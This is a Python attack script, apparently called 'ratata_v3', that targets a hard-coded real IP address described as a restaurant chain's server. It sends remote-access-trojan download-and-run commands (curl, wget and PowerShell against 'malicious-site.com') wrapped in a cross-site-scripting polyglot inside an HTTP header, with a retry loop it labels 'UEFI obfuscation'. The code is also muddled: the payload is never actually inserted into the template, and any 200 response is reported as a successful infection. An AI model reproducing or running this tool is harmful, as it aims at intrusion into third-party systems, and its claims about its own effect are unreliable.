#ratata_v3 by earth13x and aaron mazie investments

import requests
import binascii
import time
import os
import random
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Disable warnings about unverified HTTPS requests
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Predefined list of RHOSTS
RHOSTS = [
    "13.89.113.79" #chuckecheese.com master of all servers
]

external_payloads = []

# Polyglot JavaScript code template with a placeholder for injection
polyglot_template = "/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+{}//'>"

# RAT (Remote Access Trojan) payloads
rat_payloads = [
    "curl -O http://malicious-site.com/rat.bin && chmod +x rat.bin && ./rat.bin",  # Download and execute RAT
    "wget http://malicious-site.com/rat.bin -O rat.bin && chmod +x rat.bin && ./rat.bin",  # Alternative download method
    "powershell -Command \"Invoke-WebRequest -Uri http://malicious-site.com/rat.exe -OutFile rat.exe; Start-Process rat.exe\""  # Windows PowerShell RAT download
]

# Function to inject the RAT payload into the polyglot template
def create_polyglot_payload(rat_payload):
    # Replace the placeholder in the polyglot template with the actual RAT payload
    return polyglot_template.format(rat_payload)

# Function to generate the payloads with polyglot obfuscation
def generate_payloads():
    global payloads
    payloads = []
    for rat_payload in rat_payloads:
        polyglot_payload = create_polyglot_payload(rat_payload)
        payloads.append(polyglot_payload)

    if external_payloads:
        print(f"Adding {len(external_payloads)} external payloads from file.")
        payloads.extend(external_payloads)

# Function to modify the UEFI obfuscation for each iteration
def modify_uefi_polyglot(original_polyglot, iteration):
    # Example modification: Randomly inserting junk data or encoding sections
    modifications = [
        lambda s: s.replace("+", f"+{binascii.hexlify(os.urandom(3)).decode()}"),  # Add random hex after the +
        lambda s: s.replace("alert(1)", f"alert({iteration})"),  # Modify the alert part to reflect the iteration
        lambda s: s.replace("/*", f"/*{binascii.b2a_base64(os.urandom(5)).decode()}")  # Add random base64 in comment
    ]
    for mod in modifications:
        original_polyglot = mod(original_polyglot)
    return original_polyglot

# Recursive function to learn and adjust obfuscation
def recursive_obfuscation(ip, payload, iteration, max_iterations=100):
    if iteration > max_iterations:
        print(f"Max iterations reached for {ip}. Moving to next target.")
        return False

    headers = {}
    headers[f"Header-1023"] = payload  # Insert the payload into the last header
    try:
        response = requests.get(f"https://{ip}:443", headers=headers, verify=False, timeout=15)
        print(f"[Iteration {iteration}] Response code: {response.status_code}")

        if response.status_code == 200:
            print(f"RAT payload executed successfully on {ip}.")
            return True
        else:
            print(f"Failed to execute RAT on {ip}. Modifying polyglot and retrying...")

            # Modify the polyglot with UEFI-specific obfuscation
            modified_payload = modify_uefi_polyglot(payload, iteration)
            return recursive_obfuscation(ip, modified_payload, iteration + 1, max_iterations)

    except requests.exceptions.RequestException as e:
        print(f"Error sending payload to {ip}: {e}")
        return False

# Function to load external payloads from a .txt file
def load_external_payloads(file_path):
    global external_payloads
    if os.path.exists(file_path):
        try:
            with open(file_path, 'r') as file:
                for line in file:
                    line = line.strip()
                    if line:
                        polyglot_payload = create_polyglot_payload(line)
                        external_payloads.append(polyglot_payload)
            print(f"Loaded {len(external_payloads)} payloads from {file_path}.")
        except Exception as e:
            print(f"Error loading payloads from file: {file_path}. Error: {e}")
    else:
        print(f"File not found: {file_path}. No external payloads loaded.")

# Main entry function
def init():
    # Get the number of iterations from the user
    iterations = input("Enter the number of iterations for the polyglot brute force function (default is 100): ").strip()
    if not iterations.isdigit():
        iterations = 100
    else:
        iterations = int(iterations)

    # Optionally load external payloads from a .txt file
    file_path = input("Enter the file path for additional payloads (leave blank if none): ").strip()
    if file_path:
        load_external_payloads(file_path)

    # Generate polyglot-obfuscated payloads
    generate_payloads()

    # Iterate through each RHOST and payload
    for rhost in RHOSTS:
        print(f"\n[*] Targeting {rhost}")
        for payload in payloads:
            if not recursive_obfuscation(rhost, payload, 1, iterations):
                print(f"Failed to execute RAT on {rhost} after {iterations} iterations.")

# Start the script
if __name__ == "__main__":
    init()
